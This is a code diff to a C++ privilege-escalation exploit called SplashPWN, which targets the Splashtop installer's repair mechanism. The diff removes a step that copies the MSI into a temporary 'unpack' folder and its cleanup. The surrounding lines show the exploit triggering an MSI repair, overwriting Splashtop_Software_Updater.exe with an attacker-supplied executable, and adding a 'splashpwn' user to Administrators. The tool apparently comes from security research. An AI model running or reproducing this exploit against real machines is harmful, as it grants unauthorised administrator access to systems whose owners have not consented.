@@ -220,7 +220,6 @@ int main(int argc, char* argv[])
     std::string OurEXEPath = argv[2];
     std::string SplashtopProductID = GetSplashtopProductID();
     std::string localAppData = std::getenv("LOCALAPPDATA");
-    std::string UnpackFolder = localAppData + "\\temp\\unpack";
     std::string SplashtopTempFolder = localAppData + "\\temp\\" + SplashtopProductID;
     std::string SSUPath = SplashtopTempFolder + "\\" + "Splashtop_Software_Updater.exe";
     
@@ -228,20 +227,6 @@ int main(int argc, char* argv[])
     char FileName[_MAX_FNAME];
     char ext[_MAX_EXT];   
     _splitpath(MSIPath.c_str(), NULL, NULL, FileName, ext);
-    std::string MSITempPath = UnpackFolder + "\\" + FileName + ext;
-
-
-    std::cout << "\n[i] Creating an 'unpack' directory in appdata\\local\\temp" << std::endl;
-    CreateDirectory(UnpackFolder.c_str(), NULL);
-
-    std::cout << "[i] Copying the splashtop msi from c:\\windows\\installer to the 'unpack' directory" << std::endl;
-    if (CopyFileA(MSIPath.c_str(), MSITempPath.c_str(), FALSE)) {
-        // file copied successfully
-    }
-    else {
-        std::cout << "[ERROR] File copy failed." << std::endl;
-        return 1;
-    }
 
     std::cout << "[i] Starting a repair with MsiConfigureProductExA" << std::endl;
     std::cout << "[i] Overwriting Splashtop_Software_Updater.exe with our own exe" << std::endl;
@@ -286,16 +271,6 @@ int main(int argc, char* argv[])
     }
     else {
         std::cout << "[ERROR] User splashpwn was not added to Administrators" << std::endl;
-    }
-    
-    int removeMSI = remove(MSITempPath.c_str());
-    int removeUnpackFolder = RemoveDirectory(UnpackFolder.c_str());
-
-    if (removeMSI == 0 && removeUnpackFolder == 1) {
-        std::cout << "[i] Unpack folder removed" << std::endl;
-    }
-    else {
-        std::cout << "[ERROR] Unpack folder could not be removed" << std::endl;
     }
    
     std::cout << "[+] SplashPWN is finished. May the odds be ever in your favor" << std::endl;
